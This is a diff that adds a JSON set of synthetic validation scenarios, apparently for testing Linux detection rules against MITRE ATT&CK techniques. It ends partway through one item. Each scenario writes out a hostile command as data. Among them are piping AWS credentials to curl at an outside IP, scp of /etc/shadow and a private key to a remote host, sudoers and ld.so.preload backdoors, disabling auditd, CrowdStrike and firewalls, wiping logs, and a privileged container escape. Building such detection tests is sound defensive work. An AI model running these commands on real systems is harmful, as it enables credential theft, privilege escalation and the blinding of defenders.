@@ -1,0 +1,2798 @@
+{
+ "scenarios": [
+  {
+   "id": "val3-t1543-002-unit-in-etc",
+   "name": "Service unit dropped into /etc/systemd/system",
+   "description": "Independent validation scenario for T1543.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/systemd/system/cups-helper.service",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1543.002"
+   ]
+  },
+  {
+   "id": "val3-t1543-002-enable-shm",
+   "name": "Enabling a unit staged in /dev/shm",
+   "description": "Independent validation scenario for T1543.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl enable --now /dev/shm/netmon.service",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1543.002"
+   ]
+  },
+  {
+   "id": "val3-t1053-003-crond-hidden",
+   "name": "Cron job dropped as hidden file in cron.d",
+   "description": "Independent validation scenario for T1053.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/cron.d/.apt-daily",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1053.003"
+   ]
+  },
+  {
+   "id": "val3-t1053-003-echo-crond",
+   "name": "Cron entry echoed into cron.d with a root user field",
+   "description": "Independent validation scenario for T1053.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c echo \"*/10 * * * * root /tmp/.u\" >> /etc/cron.d/sysstat",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1053.003"
+   ]
+  },
+  {
+   "id": "val3-t1053-003-crontab-u-file",
+   "name": "crontab -u loading a prepared file",
+   "description": "Independent validation scenario for T1053.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/crontab",
+     "command": "crontab -u www-data /tmp/cron.txt",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1053.003"
+   ]
+  },
+  {
+   "id": "val3-t1574-006-ldpreload-echo",
+   "name": "Userland rootkit registered in ld.so.preload",
+   "description": "Independent validation scenario for T1574.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1574.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c echo /lib/libprocesshider.so >> /etc/ld.so.preload",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1574.006"
+   ]
+  },
+  {
+   "id": "val3-t1037-004-rclocal-sed",
+   "name": "rc.local edited in place with sed",
+   "description": "Independent validation scenario for T1037.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1037.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/sed",
+     "command": "sed -i $i /opt/.b/start.sh /etc/rc.local",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1037.004"
+   ]
+  },
+  {
+   "id": "val3-t1556-003-pam-so",
+   "name": "Rogue PAM module dropped",
+   "description": "Independent validation scenario for T1556.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1556.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/lib/security/pam_backdoor.so",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1556.003"
+   ]
+  },
+  {
+   "id": "val3-t1098-004-authkeys-append",
+   "name": "Operator key appended to a service account",
+   "description": "Independent validation scenario for T1098.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1098.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/sh",
+     "command": "sh -c echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake op@laptop\" >> /home/deploy/.ssh/authorized_keys",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1098.004"
+   ]
+  },
+  {
+   "id": "val3-t1098-004-install-key",
+   "name": "authorized_keys written with install",
+   "description": "Independent validation scenario for T1098.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1098.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/install",
+     "command": "install -m 600 /tmp/k.pub /root/.ssh/authorized_keys",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1098.004"
+   ]
+  },
+  {
+   "id": "val3-t1546-017-udev-tee",
+   "name": "udev rule that runs a script on block devices",
+   "description": "Independent validation scenario for T1546.017, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.017"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c printf 'SUBSYSTEM==\"block\", RUN+=\"/bin/sh /var/tmp/u.sh\"\\n' | tee /etc/udev/rules.d/80-local.rules",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1546.017"
+   ]
+  },
+  {
+   "id": "val3-t1547-013-autostart",
+   "name": "Autostart desktop entry for a fake GNOME helper",
+   "description": "Independent validation scenario for T1547.013, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.013"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/home/dev/.config/autostart/gnome-helper.desktop",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1547.013"
+   ]
+  },
+  {
+   "id": "val3-t1547-006-insmod-home",
+   "name": "Rootkit module inserted from a home directory",
+   "description": "Independent validation scenario for T1547.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/insmod",
+     "command": "insmod /home/user/rk/reptile.ko",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1547.006"
+   ]
+  },
+  {
+   "id": "val3-t1547-006-insmod-relative",
+   "name": "Rootkit module inserted with a relative path",
+   "description": "Independent validation scenario for T1547.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/insmod",
+     "command": "insmod ./reptile.ko",
+     "parent_exe": "/bin/sh"
+    }
+   ],
+   "expect": [
+    "T1547.006"
+   ]
+  },
+  {
+   "id": "val3-t1136-001-usermod-uid0",
+   "name": "Existing account converted to uid 0",
+   "description": "Independent validation scenario for T1136.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1136.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/usermod",
+     "command": "usermod -o -u 0 svc-backup",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1136.001"
+   ]
+  },
+  {
+   "id": "val3-t1548-003-sudoers-dropin",
+   "name": "NOPASSWD drop-in for a deploy account",
+   "description": "Independent validation scenario for T1548.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c echo \"deploy ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/deploy",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1548.003"
+   ]
+  },
+  {
+   "id": "val3-t1548-001-setcap-perl",
+   "name": "Perl given cap_setuid",
+   "description": "Independent validation scenario for T1548.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/setcap",
+     "command": "setcap cap_setuid+ep /usr/bin/perl",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1548.001"
+   ]
+  },
+  {
+   "id": "val3-t1548-001-suid-var-tmp",
+   "name": "Copied shell made setuid in /var/tmp",
+   "description": "Independent validation scenario for T1548.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/chmod",
+     "command": "chmod 6755 /var/tmp/sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1548.001"
+   ]
+  },
+  {
+   "id": "val3-t1003-008-scp-shadow",
+   "name": "shadow file scp'd out",
+   "description": "Independent validation scenario for T1003.008, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/scp",
+     "command": "scp /etc/shadow ops@203.0.113.7:/tmp/",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1003.008"
+   ]
+  },
+  {
+   "id": "val3-t1003-008-python-read",
+   "name": "shadow read by an inline Python program",
+   "description": "Independent validation scenario for T1003.008, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/python3",
+     "command": "python3 -c print(open('/etc/shadow').read())",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1003.008"
+   ]
+  },
+  {
+   "id": "val3-t1563-001-agent-sock",
+   "name": "Another user's ssh agent socket reused",
+   "description": "Independent validation scenario for T1563.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1563.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c SSH_AUTH_SOCK=/tmp/ssh-ABCDEFg123/agent.2210 ssh -A admin@dbhost",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1563.001"
+   ]
+  },
+  {
+   "id": "val3-t1003-007-cat-environ",
+   "name": "Another process environment read by pid",
+   "description": "Independent validation scenario for T1003.007, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/cat",
+     "command": "cat /proc/3012/environ",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1003.007"
+   ]
+  },
+  {
+   "id": "val3-t1003-007-gcore-a",
+   "name": "gcore with all-mappings flag",
+   "description": "Independent validation scenario for T1003.007, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/gcore",
+     "command": "gcore -a -o /tmp/dump 2210",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1003.007"
+   ]
+  },
+  {
+   "id": "val3-t1056-001-strace-sshd",
+   "name": "strace on the oldest sshd reading input",
+   "description": "Independent validation scenario for T1056.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1056.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/strace",
+     "command": "strace -p $(pgrep -x sshd | head -1) -e read -o /tmp/ssh.out",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1056.001"
+   ]
+  },
+  {
+   "id": "val3-t1552-001-aws-pipe",
+   "name": "AWS credentials piped to curl",
+   "description": "Independent validation scenario for T1552.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c cat ~/.aws/credentials | curl -d @- http://198.51.100.9/c",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.001"
+   ]
+  },
+  {
+   "id": "val3-t1552-001-tar-dotdirs",
+   "name": "Cloud config dot-directories tarred",
+   "description": "Independent validation scenario for T1552.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/tar",
+     "command": "tar -zcf /tmp/a.tgz /home/ops/.aws /home/ops/.kube",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.001"
+   ]
+  },
+  {
+   "id": "val3-t1552-004-scp-key",
+   "name": "Private key copied to a remote host",
+   "description": "Independent validation scenario for T1552.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/scp",
+     "command": "scp /home/ops/.ssh/id_rsa attacker@203.0.113.7:/tmp",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.004"
+   ]
+  },
+  {
+   "id": "val3-t1552-003-grep-history",
+   "name": "Secrets grepped from shell history",
+   "description": "Independent validation scenario for T1552.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/grep",
+     "command": "grep -E (pass|token) /home/ops/.bash_history",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.003"
+   ]
+  },
+  {
+   "id": "val3-t1555-003-chrome-cookies",
+   "name": "Chrome cookies queried",
+   "description": "Independent validation scenario for T1555.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/sqlite3",
+     "command": "sqlite3 /home/ops/.config/google-chrome/Default/Cookies select host_key,name from cookies",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1555.003"
+   ]
+  },
+  {
+   "id": "val3-t1070-003-history-c",
+   "name": "History cleared",
+   "description": "Independent validation scenario for T1070.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c history -c && history -w",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.003"
+   ]
+  },
+  {
+   "id": "val3-t1070-003-null-redirect",
+   "name": "History file emptied by redirect",
+   "description": "Independent validation scenario for T1070.003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c cat /dev/null > ~/.bash_history",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.003"
+   ]
+  },
+  {
+   "id": "val3-t1070-002-echo-authlog",
+   "name": "auth.log blanked with echo",
+   "description": "Independent validation scenario for T1070.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c echo \"\" > /var/log/auth.log",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.002"
+   ]
+  },
+  {
+   "id": "val3-t1070-002-find-truncate",
+   "name": "Every log truncated with find",
+   "description": "Independent validation scenario for T1070.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/find",
+     "command": "find /var/log -type f -exec truncate -s0 {} ;",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.002"
+   ]
+  },
+  {
+   "id": "val3-t1562-012-auditctl-off",
+   "name": "Audit disabled with auditctl",
+   "description": "Independent validation scenario for T1562.012, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.012"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/auditctl",
+     "command": "auditctl -e 0",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.012"
+   ]
+  },
+  {
+   "id": "val3-t1562-012-disable-auditd",
+   "name": "auditd disabled",
+   "description": "Independent validation scenario for T1562.012, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.012"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl disable --now auditd",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.012"
+   ]
+  },
+  {
+   "id": "val3-t1562-001-osquery-off",
+   "name": "osquery disabled",
+   "description": "Independent validation scenario for T1562.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl disable --now osqueryd",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.001"
+   ]
+  },
+  {
+   "id": "val3-t1562-001-falconctl",
+   "name": "CrowdStrike sensor uninstalled via falconctl",
+   "description": "Independent validation scenario for T1562.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/opt/CrowdStrike/falconctl",
+     "command": "falconctl -d -f",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.001"
+   ]
+  },
+  {
+   "id": "val3-t1562-004-ufw-force",
+   "name": "ufw force-disabled",
+   "description": "Independent validation scenario for T1562.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/ufw",
+     "command": "ufw --force disable",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.004"
+   ]
+  },
+  {
+   "id": "val3-t1562-004-iptables-flush",
+   "name": "iptables flushed and chains deleted",
+   "description": "Independent validation scenario for T1562.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/iptables",
+     "command": "iptables -F",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/sbin/iptables",
+     "command": "iptables -X",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.004"
+   ]
+  },
+  {
+   "id": "val3-t1564-001-hidden-mkdir",
+   "name": "Hidden store directory in /tmp",
+   "description": "Independent validation scenario for T1564.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/mkdir",
+     "command": "mkdir /tmp/.hidden-store",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1564.001"
+   ]
+  },
+  {
+   "id": "val3-t1564-001-exec-python-hidden",
+   "name": "Binary run from a hidden python dir in shm",
+   "description": "Independent validation scenario for T1564.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/dev/shm/.python/py",
+     "command": "./py -c 1",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1564.001"
+   ]
+  },
+  {
+   "id": "val3-t1070-006-touch-tm",
+   "name": "Access and modify times forged",
+   "description": "Independent validation scenario for T1070.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/touch",
+     "command": "touch -a -m -t 201201010000.00 /etc/cron.d/sysupd",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.006"
+   ]
+  },
+  {
+   "id": "val3-t1222-002-chattr-preload",
+   "name": "ld.so.preload made immutable",
+   "description": "Independent validation scenario for T1222.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1222.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/chattr",
+     "command": "chattr +i /etc/ld.so.preload",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1222.002"
+   ]
+  },
+  {
+   "id": "val3-t1036-004-exec-a-ksoftirqd",
+   "name": "Agent renamed to a kernel thread name",
+   "description": "Independent validation scenario for T1036.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1036.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c (exec -a [ksoftirqd/1] ./agent &)",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1036.004"
+   ]
+  },
+  {
+   "id": "val3-t1564-bind-proc",
+   "name": "Miner hidden behind a bind mount",
+   "description": "Independent validation scenario for T1564, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/mount",
+     "command": "mount -o bind /tmp/e /proc/9911",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1564"
+   ]
+  },
+  {
+   "id": "val3-t1611-priv-pid-host",
+   "name": "Privileged pid=host container running nsenter",
+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i bash",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1611-sock-create-binds",
+   "name": "Container created through the socket with a root bind",
